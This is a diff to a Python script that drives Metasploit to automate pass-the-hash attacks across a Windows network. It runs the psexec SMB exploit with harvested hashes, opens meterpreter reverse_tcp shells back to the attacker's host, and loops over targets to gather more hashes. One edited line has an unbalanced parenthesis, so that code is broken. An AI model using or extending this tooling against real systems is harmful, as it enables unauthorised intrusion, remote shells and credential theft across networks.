@@ -94,7 +94,7 @@ def passTheHash(ip, localip, hashlist, client):
     print('Attempting to access ' + str(ip) + ' with hash list...')
     exploit = client.modules.use('exploit', 'windows/smb/psexec')
     exploit['RHOST'] = ip
-    payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
+    payload = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
     payload['LHOST'] = localip
     # try each of the hashes until one works
     for data in hashlist:
@@ -126,12 +126,11 @@ def runExploit(client, exploit, payload):
     # Exploit the host
     proc = exploit.execute(payload=payload)
     jobId = proc.get('job_id') + 1 # add 1 because pymetasploit is horribly written
-    print(proc.get('job_id'))
-    print(jobId)
+    print(str(proc.get('job_id')) + " - " + str(jobId))
     timeout = 50
     count = 0
     while(jobId not in client.sessions.list.keys() and count < timeout):
-        time.sleep(1)
+        time.sleep(3)
         print(client.sessions.list.keys())
         count += 1
     if count >= timeout:
@@ -192,7 +191,7 @@ def main():
         # Found access to network start spidering
         print('Starting hash passing...')
         for i in range(len(targets)):
-            newHashes = passTheHash(args['targetIp'], args['localIp'], hashes, client)
+            newHashes = passTheHash(targets[i].get('ip', args['localIp'], hashes, client)
             if newHashes != None:
                 print('Adding ' + str(len(newHashes)) + ' to the hash list')
                 mergeList(hashes, newHashes)
